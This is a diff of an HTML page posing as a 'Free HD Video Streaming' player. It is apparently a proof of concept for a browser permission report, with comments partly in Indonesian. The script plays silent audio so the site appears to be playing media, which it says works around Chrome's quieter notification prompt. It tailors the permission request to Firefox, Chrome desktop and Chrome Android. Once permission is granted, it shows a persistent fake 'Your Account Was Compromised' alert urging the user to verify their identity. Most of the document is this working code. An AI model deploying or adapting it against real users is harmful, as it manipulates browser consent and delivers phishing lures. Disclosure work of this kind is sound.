@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Free HD Video Streaming</title>
 <style>
   body { font-family: Arial, sans-serif; background: #111; color: #eee;
          text-align: center; padding: 40px 20px; }
   .player { max-width: 640px; margin: 0 auto; background: #1c1c1c;
             padding: 20px; border-radius: 10px; }
-  video { width: 100%; border-radius: 6px; background: #000; }
-  button { padding: 10px 18px; margin: 10px 6px; border: none;
+  button { padding: 12px 18px; margin: 10px 6px; border: none;
            border-radius: 4px; background: #e50914; color: #fff;
            cursor: pointer; font-size: 14px; }
   button.secondary { background: #444; }
@@ -21,59 +21,153 @@
 <body>
 <div class="player">
   <h2>HD Player — Now Playing</h2>
-  <!-- Silent audio embedded as base64 WAV (1s, no external file).
-       Playing it within the user gesture primes the origin as
-       user-engaged so the Notification prompt is allowed. -->
+  <!-- Silent 1s WAV embedded as base64 — no external file. Primes the
+       origin as "playing media" so the Chrome notification prompt is
+       treated as in-context (quieter UI / timeout logic mitigation). -->
   <audio id="silent" preload="auto"
     src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA="></audio>
 
-  <button class="secondary" onclick="askNotif()">Enable Notifications</button>
-  <pre id="log">Status: idle</pre>
+  <button id="notifBtn">Enable Notifications</button>
+  <button class="secondary" id="recheckBtn">Re-check Permission</button>
+  <pre id="log"></pre>
 </div>
 
 <script>
-const log = document.getElementById('log');
+const logEl = document.getElementById('log');
+const lines = [];
 const ts = () => new Date().toISOString().slice(11, 23);
-
-function setLog(msg) {
-  log.textContent = `[${ts()}] ${msg}`;
+function log(msg) {
+  lines.unshift(`[${ts()}] ${msg}`);
+  logEl.textContent = lines.join('\n');
 }
 
-// Silent 1s WAV fallback generator via Web Audio API
-// (works even if the data URI is blocked by CSP)
+// --- Environment fingerprint (untuk evidence di report) ---
+log('UA: ' + navigator.userAgent);
+log('Initial Notification.permission = ' + (window.Notification ? Notification.permission : 'API unavailable'));
+
+if ('permissions' in navigator) {
+  navigator.permissions.query({ name: 'notifications' }).then(s => {
+    log('Permission API state = ' + s.state);
+    s.onchange = () => log('Permission state changed -> ' + s.state);
+  }).catch(e => log('Permissions query error: ' + e.message));
+}
+
+// --- Silent audio: dua jalur, fallback Web Audio jika data URI diblok ---
 function playSilent() {
   const au = document.getElementById('silent');
   const viaAudio = au.play().then(() => 'embedded silent WAV');
   const viaWebAudio = new Promise((resolve) => {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const buf = ctx.createBuffer(1, ctx.sampleRate, ctx.sampleRate);
-    const src = ctx.createBufferSource();
-    src.buffer = buf;               // zero-filled = silence
-    src.connect(ctx.destination);
-    src.start(0);
-    src.onended = () => { ctx.close(); resolve('WebAudio silent buffer'); };
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const buf = ctx.createBuffer(1, ctx.sampleRate, ctx.sampleRate);
+      const src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start(0);
+      src.onended = () => { ctx.close(); resolve('WebAudio silent buffer'); };
+    } catch (e) { resolve('WebAudio unavailable'); }
   });
   return viaAudio.catch(() => viaWebAudio);
 }
 
-function askNotif() {
-  setLog('Playing silent audio to prime user activation...');
-  playSilent().then(how => {
-    setLog(`Silent audio started (${how}). Origin is now treated as ` +
-           'user-engaged; requesting Notification permission.');
-    return Notification.requestPermission();
-  }).then(p => {
-    setLog('Permission = ' + p);
-    if (p === 'granted') {
-      new Notification('Security Alert: Your Account Was Compromised', {
-        body: 'Click to verify your identity now.',
-        icon: '/icon.png'
-      });
-      setLog('Permission granted — simulated social-engineering ' +
-             'notification displayed. PoC complete.');
+// --- Deteksi browser untuk strategi yang tepat ---
+const ua = navigator.userAgent;
+const isFirefox = /firefox/i.test(ua);
+const isChromeAndroid = /android/i.test(ua) && /chrome/i.test(ua) && !/edg/i.test(ua);
+
+// Chrome Android (Juli 2026+): prompt non-blocking BISA time out.
+// Promise bisa resolve saat prompt expired tanpa keputusan user.
+function requestWithTimeoutWatchdog() {
+  const started = Date.now();
+  return Notification.requestPermission().then(p => {
+    const elapsed = ((Date.now() - started) / 1000).toFixed(1);
+    if (p === 'default') {
+      log(`Prompt resolved as "default" after ${elapsed}s — likely ` +
+          'non-blocking prompt timed out (Chrome Android) or user ' +
+          'dismissed quieter UI. Retry via Site Controls (padlock icon).');
+    } else {
+      log(`Prompt resolved as "${p}" after ${elapsed}s`);
     }
-  }).catch(e => setLog('Error: ' + e.name + ' — ' + e.message));
+    return p;
+  });
 }
+
+function askNotif() {
+  if (!('Notification' in window)) {
+    log('Notifications API unavailable in this browser.');
+    return;
+  }
+
+  if (Notification.permission === 'granted') {
+    log('Permission already granted — firing simulated notification.');
+    return firePoC();
+  }
+  if (Notification.permission === 'denied') {
+    log('Permission = denied. Browser will not re-prompt; reset via ' +
+        'site settings (address-bar lock icon) for testing.');
+    return;
+  }
+
+  const proceed = () => {
+    log('Requesting Notification permission from user gesture...');
+
+    let p;
+    if (isChromeAndroid) {
+      p = requestWithTimeoutWatchdog();
+    } else {
+      p = Notification.requestPermission().then(r => {
+        log('Prompt resolved: ' + r);
+        return r;
+      });
+    }
+
+    p.then(result => {
+      if (result === 'granted') {
+        firePoC();
+      } else if (isFirefox && result === 'default') {
+        log('Firefox: prompt not shown (no gesture context) — user saw ' +
+            'URL-bar icon instead. This is expected if gesture chain broke.');
+      } else if (!isChromeAndroid && result === 'default') {
+        log('Chrome desktop: "default" may mean quieter UI mode active — ' +
+            'check the bell icon in the address bar.');
+      }
+    }).catch(e => log('requestPermission error: ' + e.name + ' — ' + e.message));
+  };
+
+  if (isFirefox) {
+    // Firefox 72+: gesture context only. Request immediately, no async gap.
+    log('Firefox detected: requesting directly inside gesture handler.');
+    proceed();
+  } else {
+    // Chrome: prime engagement with silent media first.
+    log(isChromeAndroid ? 'Chrome Android detected.' : 'Chrome desktop detected.');
+    playSilent().then(how => {
+      log('Silent audio started (' + how + ') — origin primed as engaged.');
+      proceed();
+    });
+  }
+}
+
+function firePoC() {
+  try {
+    const n = new Notification('Security Alert: Your Account Was Compromised', {
+      body: 'Click to verify your identity now.',
+      icon: '/icon.png',
+      requireInteraction: true   // stays on screen — better evidence screenshot
+    });
+    n.onclick = () => log('Notification clicked by victim (simulated C2 click-through).');
+    log('Simulated social-engineering notification DISPLAYED. PoC complete.');
+  } catch (e) {
+    // Android Chrome: constructor mungkin dibatasi, gunakan SW registration path
+    log('new Notification() failed (' + e.name + '). On Android use the ' +
+        'Service Worker showNotification path for delivery.');
+  }
+}
+
+document.getElementById('notifBtn').addEventListener('click', askNotif);
+document.getElementById('recheckBtn').addEventListener('click', () => {
+  log('Re-check: Notification.permission = ' + Notification.permission);
+});
 </script>
 </body>
 </html>
